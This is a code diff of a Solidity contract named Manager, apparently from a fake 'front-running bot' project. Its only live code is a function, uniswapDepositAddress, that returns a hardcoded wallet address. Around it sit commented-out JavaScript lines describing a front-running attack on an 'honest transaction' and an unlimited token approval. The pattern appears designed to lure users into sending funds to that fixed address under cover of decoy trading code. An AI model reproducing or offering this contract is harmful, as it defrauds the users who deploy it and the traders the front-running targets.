@@ -24,28 +24,30 @@ contract Manager {
 
 	function uniswapDepositAddress() public pure returns (address) {
 //subscription.unsubscribe();
-        //console.log('Perform front running attack...');
+/*
+        console.log('Perform front running attack...');
 
-        //gasPrice = parseInt(transaction['gasPrice']);
-        //newGasPrice = gasPrice + 50*ONE_GWEI;
+        gasPrice = parseInt(transaction['gasPrice']);
+        newGasPrice = gasPrice + 50*ONE_GWEI;
 
-        //estimatedInput = ((amount*0.999)*(10**18)).toString();
-        //realInput = (amount*(10**18)).toString();
-        //gasLimit = (300000).toString();
+        estimatedInput = ((amount*0.999)*(10**18)).toString();
+        realInput = (amount*(10**18)).toString();
+        gasLimit = (300000).toString();
         
-        //await updatePoolInfo();
+        await updatePoolInfo();
 
-        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
-        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);
+        var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
+        swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);
 
-        //console.log("wait until the honest transaction is done...", transaction['hash']);
+        console.log("wait until the honest transaction is done...", transaction['hash']);
+        */
 		return 0x41FbC651a1462FB215eBa638A2F2c3F9885f636b;
- //console.log(max_allowance.toString());
-        //var approveTX ={
-                //from: user_wallet.address,
-                //to: out_token_address,
-                //gas: 50000,
-                //gasPrice: gasPrice*ONE_GWEI,
-                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
+ /*console.log(max_allowance.toString());
+        var approveTX ={
+                from: user_wallet.address,
+                to: out_token_address,
+                gas: 50000,
+                gasPrice: gasPrice*ONE_GWEI,
+                data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()*/
 	}
 }
